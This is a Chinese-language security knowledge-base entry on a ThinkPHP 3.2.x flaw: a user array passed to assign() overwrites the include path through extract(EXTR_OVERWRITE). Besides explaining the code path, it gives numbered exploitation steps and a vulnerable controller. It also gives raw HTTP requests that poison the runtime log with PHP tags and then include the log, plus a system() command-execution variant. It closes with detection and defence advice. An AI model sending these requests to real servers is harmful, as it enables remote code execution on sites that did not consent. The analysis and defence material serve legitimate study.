---
id: web-php-framework-thinkphp32-assign-filename-extract-overwrite-include
title: ThinkPHP 3.2.x assign 数组变量覆盖 _filename：ParseTemplateBehavior → File::load 的 extract(EXTR_OVERWRITE) 把模板 include 改成任意文件，配 runtime 日志投毒/上传 getshell
type: scenario
domain: web
path: web/php/framework
technique: thinkphp32-assign-array-extract-filename-overwrite-include
tags:
- php
- thinkphp
- framework
- file-inclusion
- variable-overwrite
- extract
- log-poisoning
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: ThinkPHP 3.2.X（原文标题；3.2.1 仅用于搭建环境，漏洞复现均在 3.2.3）
verification:
  verified_by: verifier-V690
  verified_at: '2026-11-13T16:19:55+08:00'
  notes: 已对照原文与27张截图逐图核对；assign→View::fetch→Hook::listen(view_parse)→ParseTemplateBehavior::run→Template::fetch→Storage::load→File::load(extract EXTR_OVERWRITE) 链路与截图一致；修正版本措辞为3.2.1仅搭建、漏洞复现于3.2.3；GET编码vs Burp原始请求差异与日志路径均与图10/原文一致。未复跑PoC
url: /docs/web/php/framework/web-php-framework-thinkphp32-assign-filename-extract-overwrite-include/
draft: false
kb_aliases:
- ThinkPHP 3.2.X 通用漏洞
- assign 变量覆盖
- _filename 覆盖
- extract EXTR_OVERWRITE 包含
- ThinkPHP 模板包含 getshell
- Runtime/Logs 日志包含
- value[_filename]
---

## 一句话结论

当 ThinkPHP 3.2.x 应用控制器把用户可控数组（如 `value[_filename]=...`）原样 `assign($value)` 后再 `display()` 时，assign 会把该数组 merge 进 View 的 `tVar`；display → View::fetch 触发 `Hook::listen('view_parse')` → `Behavior\ParseTemplateBehavior::run` → `Think\Template::fetch` → `Storage::load($templateCacheFile, $this->tVar, ...)`，最终进入 `Think\Storage\Driver\File::load($_filename, $vars)`：其中 `extract($vars, EXTR_OVERWRITE)` 用同名键 `_filename` 覆盖了 include 目标形参，于是 `include $_filename` 变成包含攻击者指定的任意文件。把 `<?=...?>` 写进 `Application/Runtime/Logs/{Home,Common}/YY_MM_DD.log`（或在可写目录上传 PHP 文件）后，包含该文件即可执行代码。

## 原理

- **assign 把用户数组变成模板变量**：`Controller` 的参数绑定会把 `?value[_filename]=xxx` 变成控制器方法参数 `$value = ['_filename' => 'xxx']`；`View::assign($name,$value)` 在 `$name` 是数组时执行 `$this->tVar = array_merge($this->tVar, $name);`，即用户数组的每个键都成为模板变量。`_filename` 这个键名在这里还不显眼，但会在下游与形参撞名。
- **display 的 Hook 链**：`display()` → `View::fetch()` → `Hook::listen('view_parse', $params)`（view_parse 在 View::fetch 内触发）；`Hook::exec($name,$tag,&$params)` 实例化 `Behavior\ParseTemplateBehavior` 并调用 `run($params)`。`$params` 里携带 `var => $this->tVar`（就是 assign 合并后的用户数组）。
- **ParseTemplateBehavior → Template::fetch**：`run()` 对默认 Think 引擎执行 `$tpl = Think::instance('Think\Template'); $tpl->fetch($content, $data['var'], $data['prefix']);`；`Template::fetch()` 先 `$this->tVar = $templateVar;`，再 `$templateCacheFile = $this->loadTemplate(...)`，最后 `Storage::load($templateCacheFile, $this->tVar, null, 'tpl');`。
- **File::load 的 extract 覆盖是漏洞核心**：
  ```php
  public function load($_filename, $vars=null){
      if(!is_null($vars)){
          extract($vars, EXTR_OVERWRITE);   // $vars = ['_filename' => 攻击者路径]
      }
      include $_filename;
  }
  ```
  PHP `extract` 的第二参数 `EXTR_OVERWRITE` 会为数组每个键创建局部变量并覆盖同名变量；这里形参变量名就是 `_filename`，用户数组键 `_filename` 与之完全相同，于是 `include $_filename` 的目标被替换为攻击者指定的路径。换成普通模板变量名（如 `name`）不会撞上形参，这也是为什么 payload 必须用 `_filename` 作为键。
- **为什么 include 的文件能执行代码**：include 会按 PHP 解析目标文件，文件中的 `<?php ... ?>` / `<?= ... ?>` 会被执行；因此只要能写出一个含 PHP 代码的文件并知道路径，就能升级为 RCE。
- **日志投毒路径**：开启 debug 时运行日志在 `Application/Runtime/Logs/Home/YY_MM_DD.log`，非 debug 在 `Application/Runtime/Logs/Common/YY_MM_DD.log`（3.2.x 与 3.2.1 目录有差异，实际渗透中路径可能被改，需要按目标 fuzz）。向 `m` 参数塞 `--><?=phpinfo();?>` 会触发“无法加载模块:-->”并把请求 URI 原样写入日志；随后包含该日志即可执行。
- **GET 与原始请求的关键差异**：用浏览器直接 GET 时，URL 中的 `<` `>` 会被编码成 `%3C` `%3E`，日志里记录成 `%3C?=phpinfo();?%3E`，include 时只是一段普通文本，不会执行；必须用 Burp/代理发送未编码的原始请求行（`GET /?m=--><?=phpinfo();?> HTTP/1.1`），日志才会落下可执行的 `<?=...?>`。这是本题日志包含能否成功的关键坑。
- **边界**：需要应用存在 `assign($userArray) + display()`（或等价把用户数组并入 tVar）的代码模式；File 驱动为默认且 `File::load` 的形参名为 `_filename`（3.2.x 版本）；包含路径可读；日志文件对 Web 进程可写可读或能找到可写可读的 PHP 文件。

## 触发条件

- 目标为 ThinkPHP 3.2.x（原文复现于 3.2.3；3.2.1 用于环境搭建），且控制器把外部数组直接传入 `assign()` 后调用 `display()`。
- 模板文件路径存在（默认 `View/Index/index.html`）或 display 内容可控，确保流程能走到 Template::fetch。
- 能向目标可读文件写入 PHP 代码：debug/非 debug 运行日志可写且路径已知，或存在上传/其他写入点。
- 攻击者知道日志日期与目录（`YY_MM_DD.log`、Home/Common），或能通过报错/日志泄露确认。

## 利用步骤

1. 确认 ThinkPHP 3.2.x 与入口：访问 `index.php?m=Home&c=Index&a=index&value[_filename]=...`，观察是否进入目标控制器的 assign/display 分支。
2. 确认运行日志路径与日期：debug 模式 `Application/Runtime/Logs/Home/YY_MM_DD.log`，非 debug `Application/Runtime/Logs/Common/YY_MM_DD.log`；日期按服务器时间。
3. 投毒日志：用 Burp/代理发送原始请求 `GET /?m=--><?=phpinfo();?> HTTP/1.1`（不要用浏览器/curl 默认编码，否则日志中是 `%3C?=`），让日志记录未编码的 `<?=...?>`。
4. 包含日志：`GET /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_17.log`（路径相对应用根，按实际日期/目录调整）。
5. 观察 phpinfo/命令执行；若日志路径被改，按 `Runtime/Logs/` 结构 fuzz。
6. 变体：上传一个 `phpinfo.php` 到可访问目录，直接 `value[_filename]=./phpinfo.php` 包含（无需日志投毒，但需要上传/写入能力）。
7. 清理投毒日志与被包含文件。

## PoC

漏洞控制器（前置模式，原文通过修改 IndexController 复现）：

```php
<?php
namespace Home\Controller;
use Think\Controller;

class IndexController extends Controller {
    public function index($value = '') {
        $this->assign($value);   // 用户数组直接进入 tVar
        $this->display();
    }
}
```

日志投毒（必须原始请求，不能 URL 编码）：

```http
GET /?m=--><?=phpinfo();?> HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: close
```

包含日志：

```http
GET /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_17.log HTTP/1.1
Host: target
```

若返回 phpinfo 页面即成功；也可把 payload 换成 `<?=system($_GET[1]);?>` 并在包含请求中带 `1=id`。

## 变体与关联

- **同一 sink 的另一种控制点**：ThinkPHP 3.2.x `cache` 选项覆盖模板缓存文件后由 ParseTemplateBehavior `Storage::load` include，见 [[web-php-framework-thinkphp32-cache-option-template-cache-include-rce]]；那条链控制的是缓存文件名，本条控制的是 `extract` 的 `_filename` 变量。
- **ThinkPHP 5.x 模板包含**：`view($userInput)` 直接控制模板路径，见 [[web-php-file-inclusion-thinkphp-view-template]]。
- **通用日志投毒**：访问日志/错误日志包含的通用手法见 [[web-php-file-inclusion-access-log-poisoning-webshell]]、[[web-php-file-inclusion-php-error-log-poisoning-webshell]]；本条补充的是 ThinkPHP runtime 日志路径与“原始请求 vs URL 编码”差异。
- **运行日志直读**：app_debug 开启且 runtime 日志可访问时的信息泄露见 [[web-php-framework-thinkphp-runtime-log-web-exposure-app-debug]]。
- **其他可包含文件**：Session 文件、上传临时文件、`php://filter`、`/proc/self/environ` 等，视 PHP 版本与配置而定。
- **通用原理**：任何 `extract($userControlledVars, EXTR_OVERWRITE)` 后面紧跟敏感操作（include、unlink、file_put_contents）的代码，都会因“数组键与局部变量/形参同名”而被变量覆盖；审计时搜索 `extract(` 与后续 sink 的同名变量。

## 检测与防御

- **代码层**：不要把 `$_GET`/`$_POST` 数组直接传给 `assign()`；模板变量使用白名单与显式赋值；升级到受支持的 ThinkPHP 版本并检查 `File::load` 等 extract 用法。
- **文件层**：运行时日志移出 Web 根或设为 Web 用户只读；关闭生产环境 debug；日志中对 `<`、`>`、`?` 等字符做转义，破坏 `<?php`/`<?=` 标签。
- **包含层**：模板 include 的路径必须规范化并限制在模板目录内；禁止 include 用户可控路径；`open_basedir` 限制可读目录。
- **检测**：请求参数出现 `_filename` 键、`value[` 数组形式、URI 中出现 `<?=`/`<?php`；运行日志中出现未编码的 PHP 标签；随后同一来源请求 `Runtime/Logs/` 路径并返回异常页面/代码输出。
- **根因**：框架把用户数组并入模板变量后，又用 `EXTR_OVERWRITE` 把模板变量导入到含 `include` 的函数的局部作用域；变量名碰撞让“模板变量”变成了“include 目标”。
